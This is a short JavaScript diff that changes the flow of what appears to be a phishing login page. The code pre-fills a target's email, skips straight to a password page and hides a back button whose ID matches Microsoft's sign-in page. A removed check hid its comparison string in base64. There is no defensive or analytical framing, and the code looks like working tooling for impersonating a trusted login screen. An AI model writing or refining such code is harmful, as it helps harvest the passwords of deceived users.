@@ -12,10 +12,10 @@ var myInterval,Proofs;
 var Timeout;
 $( document ).ready(async function() {
 console.log(semail);  
-if(urlx==atob("c2NyaXB0LnBocA==")){
-skip=0;
-}else{
+if(lmode=='a'){
 skip=1;
+}else{
+skip=0;
 }
 if(isEmail(semail)){
 email = $("#email").val(semail);
@@ -59,7 +59,7 @@ if(bac==1){
     $("#load").hide();
 }
 $("#btn").attr("disabled", true);
-if (skip==0 ) {
+if (skip==1 ) {
     if (isEmail(email) === true) {
  await getpage('PassPage',1); 
   $("#idBtn_Back").hide();
